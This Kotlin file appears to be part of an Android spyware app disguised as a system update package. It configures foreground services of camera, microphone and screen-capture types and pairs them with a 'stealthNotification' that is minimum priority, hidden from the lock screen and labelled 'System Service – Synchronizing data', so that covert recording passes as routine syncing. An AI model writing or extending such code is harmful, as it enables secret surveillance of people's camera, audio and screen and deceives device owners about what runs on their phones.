package com.androidsystem.update.net

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.pm.ServiceInfo
import android.os.Build
import androidx.core.app.NotificationCompat
import com.androidsystem.update.R

/**
 * Helper for foreground services that target Android 14+. Camera / mic / media
 * capture require the matching `foregroundServiceType`. The service must be
 * started with `Service.startForeground(id, notif, FOREGROUND_SERVICE_TYPE_* | ...)`.
 */
object ForegroundServiceTypeConfig {
    const val CHANNEL_ID = "capture_ch"
    const val NOTIF_ID = 9901

    fun ensureChannel(ctx: Context) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (nm.getNotificationChannel(CHANNEL_ID) != null) return
        val ch = NotificationChannel(CHANNEL_ID, "Background tasks", NotificationManager.IMPORTANCE_MIN).apply {
            description = "Service running in the background"
            setShowBadge(false)
        }
        nm.createNotificationChannel(ch)
    }

    fun stealthNotification(ctx: Context): Notification {
        ensureChannel(ctx)
        return NotificationCompat.Builder(ctx, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.stat_sys_download_done)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setContentTitle("System Service")
            .setContentText("Synchronizing data")
            .build()
    }

    fun startForegroundType(service: Service, type: Int) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            service.startForeground(NOTIF_ID, stealthNotification(service), type)
        } else {
            service.startForeground(NOTIF_ID, stealthNotification(service))
        }
    }

    const val TYPE_CAMERA = ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
    const val TYPE_MICROPHONE = ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
    const val TYPE_MEDIA_PROJECTION = ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
    const val TYPE_DATA_SYNC = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
}
